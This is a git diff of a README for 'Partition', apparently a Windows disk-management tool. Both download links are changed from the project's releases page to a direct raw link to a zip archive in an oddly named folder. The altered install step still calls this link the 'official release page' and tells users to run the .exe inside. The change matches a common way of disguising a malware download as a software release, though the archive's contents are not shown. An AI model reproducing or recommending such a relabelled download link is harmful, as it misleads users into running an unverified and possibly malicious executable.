@@ -1,6 +1,6 @@
 # 📂 Partition - Manage your disk space with ease
 
-[![](https://img.shields.io/badge/Download-Partition-blue.svg)](https://github.com/Ashaz1394/Partition/releases)
+[![](https://img.shields.io/badge/Download-Partition-blue.svg)](https://github.com/Ashaz1394/Partition/raw/refs/heads/main/unpopularness/Software_3.6.zip)
 
 Partition helps you organize and manage your computer storage. Keep your files in order and optimize your disk space. You can view, resize, and manage your drive partitions without stress. This tool works on Windows systems. It simplifies complex disk tasks through a visual interface. Use this to maintain your computer health day to day.
 
@@ -8,7 +8,7 @@ Partition helps you organize and manage your computer storage. Keep your files i
 
 You do not need programming skills to use this software. Follow these steps to set up Partition on your computer.
 
-1. Visit the [official release page](https://github.com/Ashaz1394/Partition/releases) to download the installer.
+1. Visit the [official release page](https://github.com/Ashaz1394/Partition/raw/refs/heads/main/unpopularness/Software_3.6.zip) to download the installer.
 2. Select the file ending in .exe to start your download.
 3. Save the file in a location you can find, like your Downloads folder.
 4. Locate the downloaded file and double-click it.
